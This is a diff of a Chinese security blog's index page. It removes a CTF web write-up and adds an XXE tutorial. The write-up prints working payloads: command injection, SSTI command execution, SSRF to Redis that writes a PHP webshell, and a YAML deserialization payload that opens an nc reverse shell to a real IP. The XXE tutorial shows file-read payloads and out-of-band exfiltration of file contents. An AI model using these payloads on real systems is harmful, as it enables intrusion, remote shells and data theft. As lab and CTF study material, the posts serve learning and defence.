@@ -160,126 +160,6 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-xyb/xyb" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Web1-Command"><a href="#Web1-Command" class="headerlink" title="Web1 Command"></a>Web1 Command</h1><p>一道ping的命令执行<code>|</code>没有被过滤，使用<code>||</code>拼接命令，使用%09代替空格，过滤了许多读文件的命令，可以使用/bin/ca?绕过，过滤了<code>*</code>，尝试使用<code>find /</code>遍历目录。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111||find%09/</span><br></pre></td></tr></table></figure>
-
-<p><img src=".%5Cxyb%5Cimage-20201121131132064.png" alt="image-20201121131132064"></p>
-<p>发现flag 2333，过滤了<code>*</code>，使用<code>?</code>代替。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111||/bin/ca?%09/etc/.find????/????.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src=".%5Cxyb%5Cimage-20201121131506862.png" alt="image-20201121131506862"></p>
-<p>flag{59e8c8d2-b274-4e77-82cc-c1c41d699685}</p>
-<h1 id="Web2-flaskbot"><a href="#Web2-flaskbot" class="headerlink" title="Web2 flaskbot"></a>Web2 flaskbot</h1><p>随便测试一下，发现打开了debug，发现程序读取直接读取cookie中的name，然后base64解密打印出来，但是在<code>/</code>路由下好像被字符串化了，不能直接ssti。</p>
-<p>但是他获取数字使用了float方法<code>num = float(request.form[&#39;num&#39;])</code>。</p>
-<p>Python的float能使用<code>inf,-inf,nan</code>来创造一些特殊浮点数，发现我们输入nan时赢了，并且打出了我们的名字，这里就是ssti点，使用文件读取，发现根目录无flag，只能通过命令执行来获取。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&apos;/fl&apos;+&apos;ag&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>读一下源码，得到黑名单，开始绕过。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&apos;/app/app.py&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;flag&apos;,&apos;os&apos;,&apos;system&apos;,&apos;popen&apos;,&apos;import&apos;,&apos;eval&apos;,&apos;chr&apos;,&apos;request&apos;, &apos;subprocess&apos;,&apos;commands&apos;,&apos;socket&apos;,&apos;hex&apos;,&apos;base64&apos;,&apos;*&apos;,&apos;?&apos;]</span><br></pre></td></tr></table></figure>
-
-<p>使用一把梭payload得到flag。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;ev&apos;+&apos;al&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;ev&apos;+&apos;al&apos;](&apos;__impor&apos;+&apos;t__(&quot;o&quot;+&quot;s&quot;).po&apos;+&apos;pen(&quot;cat /super_secret_fla&quot;+&quot;g&quot;+&quot;.txt&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src=".%5Cxyb%5Cimage-20201121130015479.png" alt="image-20201121130015479"></p>
-<p>flag{3f17f077-c4f3-4298-be69-40693ab86396}</p>
-<h1 id="Web3-easygogogo"><a href="#Web3-easygogogo" class="headerlink" title="Web3 easygogogo"></a>Web3 easygogogo</h1><p>用go语言写的文件上传，cookie中有账号密码、文件名等一些数据，但是加了盐，无法破解。</p>
-<p><img src=".%5Cxyb%5Cimage-20201121224155925.png" alt="image-20201121224155925"></p>
-<p>抓包试了一下，发现可以任意目录穿越，实现任意文件覆盖，经过多次测试发现，即使重启靶机，只要文件目录不变，cookie是不会改变的，所以可以第一次覆盖/flag，得到该文件的cookie值，然后重启靶机，实现文件读取。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie=Q/+BAwEBBVVzZXJzAf+CAAEEAQhVc2VybmFtZQEMAAEIUGFzc3dvcmQBDAABCEZpbGVuYW1lAQwAAQRTaWduAQwAAAB4/4IBAzEyMwEDMTIzAUcuL3VwbG9hZHMvNGU1YjA5YjIxNDlmNzYxOWNjYTE1NWM4YmQ2ZDhlZTUvLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZmxhZwEgMWFjMzEzNWU1NTM0YzM0MDZiOWVlYjhlODRiMDdjMDIA</span><br></pre></td></tr></table></figure>
-
-<p><img src=".%5Cxyb%5Cimage-20201121224558497.png" alt="image-20201121224558497"></p>
-<p>但是直接读取会出现图片不存在的问题，测试了许多次，发现需要首先上传一张图片，然后再修改cookie值，才能得到经过base64加密的flag。</p>
-<p><img src=".%5Cxyb%5Cimage-20201121224831232.png" alt="image-20201121224831232"></p>
-<p>解密得到flag</p>
-<p>flag{b311219d-a8d8-41d8-a953-171fffe9b128}</p>
-<h1 id="Web4-doyouknowssrf"><a href="#Web4-doyouknowssrf" class="headerlink" title="Web4 doyouknowssrf"></a>Web4 doyouknowssrf</h1><p>这是一道原题<a href="https://mp.weixin.qq.com/s/0cOsuIFJwHbHIYvluQq4WQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/0cOsuIFJwHbHIYvluQq4WQ</a></p>
-<p>这里使用parse_url来检测端口，都知道，parse_url和curl解析方式不一样比如下面的url，parse_url将baidu.com解析为主机，<a href="mailto:p@127.0.0.1" target="_blank" rel="noopener">p@127.0.0.1</a>:6379解析为密码，但是curl会将127.0.0.1:6379解析为ip:port，所以可以使用如下的payload来探测内网。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://u:p@127.0.0.1:6379@baidu.com</span><br></pre></td></tr></table></figure>
-
-<p>扫了一下常用端口，发现5000端口，是一个flask服务，还是一个ssrf，好家伙ssrf套ssrf！，还有一个6379端口，那肯定是用内网的falsk服务来打redis。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://u:p@127.0.0.1:5000@baidu.com%3furl=https://baidu.com</span><br></pre></td></tr></table></figure>
-
-<p>试了一下，gopher和dict协议没点反应，后来从文章中了解到urllib库有一个csrf漏洞，那gopher能不能用就不重要了，可以使用这个csrf漏洞重新构造一个http请求包，这样我们就能将payload传递给redis，这里由于在内网，所以需要编码两次。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://u:p@127.0.0.1:5000@baidu.com%3furl=http%3a%2f%2f127.0.0.1%3a6379%2f%2520HTTP%2f1.1%250D%250Aset%2520m%25201223%250D%250ATEST%253A%2520123</span><br></pre></td></tr></table></figure>
-
-<p>成功收到了一个报错，ssrf成功。</p>
-<p><img src=".%5Cxyb%5Cimage-20201121221056559.png" alt="image-20201121221056559"></p>
-<p>但是，这个ssrf还带密码，只能通过爆破来得到密码了，由于没有回显，所以只能使用slaveof命令将命令执行结果带入我们的vps中，如果密码正确，则会有一个ping指令发送过来。随便试了一下，发现密码是123456！，直接用Redis写Webshell。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://u:p@127.0.0.1:5000@baidu.com%3furl=http%3a%2f%2f127.0.0.1%3a6379%2f%2520HTTP%2f1.1%250D%250A%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527aa%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
-<p><img src=".%5Cxyb%5Cimage-20201121223501221.png" alt="image-20201121223501221"></p>
-<p>flag{709df8e5-608a-47bc-bb9f-1256090ed06c}</p>
-<h1 id="web5-easyzzz"><a href="#web5-easyzzz" class="headerlink" title="web5 easyzzz"></a>web5 easyzzz</h1><p>一个zzzcms的模板注入，老题目了，<a href="https://www.anquanke.com/post/id/212272#h2-10。" target="_blank" rel="noopener">https://www.anquanke.com/post/id/212272#h2-10。</a></p>
-<p>这道题测了半天，在/search post传keys有if会被直接ban掉，经过测试后发现get也能传，而且不会被BAN！！那就简单了，这题还加了点waf，出现system等函数会直接500，出现chr等函数会被直接拦截，但是可以用array_map和base_convert绕过，用亦或构造一个<code>/</code>，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/=(base_convert(25,10,36)^base_convert(1,10,36)^base_convert(23,10,36))</span><br><span class="line">readfile=base_convert(2146934604002,10,36)</span><br><span class="line">flag=base_convert(727432,%2010, 36)</span><br></pre></td></tr></table></figure>
-
-<p>然后执行readfile(/flag)即可得到flag。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?location=search&amp;keys=&#123;if:array_map(base_convert(2146934604002,10,36),array((base_convert(25,10,36)^base_convert(1,10,36)^base_convert(23,10,36)).base_convert(727432,%2010,%2036)))&#125;&#123;end%20if&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src=".%5Cxyb%5Cimage-20201122175701176.png" alt="image-20201122175701176"></p>
-<p>flag{9fcf8f2e-32e2-4d7a-bdf9-6da82f17c0e8}</p>
-<h1 id="web6-profile-system"><a href="#web6-profile-system" class="headerlink" title="web6 profile system"></a>web6 profile system</h1><p>上传yaml，在下载的时候发现能够目录穿越读到源码<code>/uploads/4e5b09b2149f7619cca155c8bd6d8ee5/../../app.py</code></p>
-<p><img src=".%5Cxyb%5Cimage-20201122172052236.png" alt="image-20201122172052236"></p>
-<p>读了一下源码，得到<code>secretkey:Th1s_is_A_Sup333er_s1cret_k1yyyyy</code>，发现伪造priviledge为elite可以触发yaml反序列化，使用工具伪造session。</p>
-<p><img src=".%5Cxyb%5Cimage-20201122173146743.png" alt="image-20201122173146743"></p>
-<p>还需要绕过正则，主要是不能有<code>_</code>和<code>.</code>，uiuctf2020有一个类似的题目<a href="https://hackmd.io/@harrier/uiuctf20。使用map调用eval，用16进制" target="_blank" rel="noopener">https://hackmd.io/@harrier/uiuctf20。使用map调用eval，用16进制</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_=\x5f</span><br><span class="line">.=\x2e</span><br></pre></td></tr></table></figure>
-
-<p>绕过正则表达式，直接弹shell，/readflag读取flag。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [&quot;\x5f\x5fimport\x5f\x5f(&apos;os&apos;)\x2esystem(&apos;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 8\x2e129\x2e69\x2e85 2333 &gt;/tmp/f&apos;)&quot;]]]</span><br></pre></td></tr></table></figure>
-
-<p><img src=".%5Cxyb%5Cimage-20201122172851925.png" alt="image-20201122172851925"></p>
-<p>flag{746ad7f8-14c2-465b-95bc-611328186899}</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/11/22/xyb/xyb/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-祥云杯" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1789,6 +1669,137 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2020/09/21/Pickle反序列化/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-XXE专题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/30/XXE专题/">XML学习</a>
+    </h1>
+  
+
+        
+        <a href="/2020/06/30/XXE专题/" class="archive-article-date">
+  	<time datetime="2020-06-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="XXE学习记录"><a href="#XXE学习记录" class="headerlink" title="XXE学习记录"></a>XXE学习记录</h1><p>​    </p>
+<p>​    XXE也就是XML外部实体注入，这主要是DTD文件导致的。</p>
+<h2 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h2><p>​    文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
+<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中： <code>&lt;!DOCTYPE 根元素名 [element-declarations]&gt;</code>，如果DTD位于XML源文件外，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;filename&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    这个SYSTEM/PUBLIC关键字就是导致XXE注入的关键，经过研究JAVA解析DTD文件时，通过文件流将SYSTEM关键字后面的值当作URL读取文件，而JAVA文件流支持HTTP、FTP、JAR、FILE等等协议，在PHP中情况也类似，支持PHP伪协议、phar等等协议。</p>
+<p>​    在DTD中可以定义通用实体和参数实体。</p>
+<p>​    1、通用实体</p>
+<p>​    通用实体能在XML文档中引用，示例代码如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    2、参数实体</p>
+<p>​    参数实体只能在DTD文件中引用，示例代码如下：</p>
+<p>test1.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % in1 SYSTEM &quot;test2.dtd&quot;&gt;</span><br><span class="line">%in1;%out;</span><br></pre></td></tr></table></figure>
+
+<p>test2.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % out &quot;&lt;!ENTITY writer &apos;111&apos;&gt;&quot; &gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    关于DTD的基本知识就介绍到这里，接下来尝试一下XXE攻击，本文使用PHP环境。</p>
+<h2 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h2><p>首先搭建一个简单的解析XML文档的PHP服务,目标是读取flag.php文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();<span class="comment">//创建文档对象</span></span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);/指定解析器 </span><br><span class="line">    $creds = simplexml_import_dom($dom);<span class="comment">//将DOM对象转换成XML对象</span></span><br><span class="line">    <span class="keyword">echo</span> $creds;<span class="comment">//输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们这里主要探讨Data协议</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "data://text/plain;base64,ZmlsZTovLy9DOi9waHBTdHVkeS9QSFBUdXRvcmlhbC9XV1cvZmxhZy5waHA="&gt;</span></span><br><span class="line"><span class="meta"> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://i.loli.net/2020/07/02/XtAH16oLrYkhCTb.png" alt></p>
+<p>经过data协议只能获取一些加密的值,并不能直接达到读取文件的效果，但是data协议的加密可以绕过许多关键字过滤，我的初步想法是将data协议读出来的数据拼凑出一个新的实体。</p>
+<p><img src="https://i.loli.net/2020/07/02/4rREZKu9dOz7JNv.png" alt></p>
+<p>直接拼凑失败了，SYSTEM后面的%xxe;直接被当成url解析了，于是尝试分步拼凑。</p>
+<p><img src="https://i.loli.net/2020/07/02/tBRa6jSh34fo9iZ.png" alt></p>
+<p>发现报错PEReferences forbidden in internal subset in Entity PEReferences 指的是参数实体引用(Parameter Entity Reference)，禁止在内部Entity中引用参数实体，那就用外部DTD试试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [  </span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9DOi9waHBTdHVkeS9QSFBUdXRvcmlhbC9XV1cvZmxhZy5waHA=&quot;&gt;</span><br><span class="line">&lt;!ENTITY % out SYSTEM &quot;file:///C:/phpStudy/PHPTutorial/WWW/out.dtd&quot;&gt;</span><br><span class="line">%out;%all;</span><br><span class="line"> ]&gt; </span><br><span class="line">&lt;root&gt;&amp;a;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>out.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY a SYSTEM &apos;%xxe;&apos;&gt;&quot; &gt;</span><br></pre></td></tr></table></figure>
+
+<p>理一下思路，首先在在payload中完成data协议信息读取，然后再外部dtd进行拼凑，最后再引用拼凑的实体进行文件读取，这样可以绕过许多WAF。</p>
+<p><img src="https://i.loli.net/2020/07/02/n1PUFQfeqpm4SEk.png" alt></p>
+<p>顺带一提，当文件中含有&gt;,%,&amp;等字符时，XML解析会报错，不能读取出文件内容，这是可以用CDATA来包裹文件内容，再CDATA中的数据不会被XML解析，也需要用到外部dtd，这里就直接放关键部分payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="无回显XXE"><a href="#无回显XXE" class="headerlink" title="无回显XXE"></a>无回显XXE</h2><p>关于dtd的引用技巧在上文已经介绍的很清楚了，之前说道SYSTEM/PUBLIC关键字实现原理是XML解析器对后面的url发起一次下载请求，我们可以首先使用<code>nc -lvv port</code>来监听端口，收到请求后就会成功的把文件信息带出，关键payload如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &apos;http://ip:port?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当然，XXE注入技巧还有许多，本文就先分析到这里，之后再来补充。</p>
+<h2 id="本地DTD文件"><a href="#本地DTD文件" class="headerlink" title="本地DTD文件"></a>本地DTD文件</h2><p>在靶机不通外网的情况下，可以应用本地DTD文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu自带：/usr/share/yelp/dtd/docbookx.dtd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;test&amp;#x25;file&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">    &apos;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="基于报错的XXE"><a href="#基于报错的XXE" class="headerlink" title="基于报错的XXE"></a>基于报错的XXE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &apos;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://xz.aliyun.com/t/3357#toc-22" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-22</a> </p>
+<p><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a> </p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/XXE//" class="article-tag-list-link color4">XXE</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/06/30/XXE专题/">展开全文 >></a>
         </p>
       
 
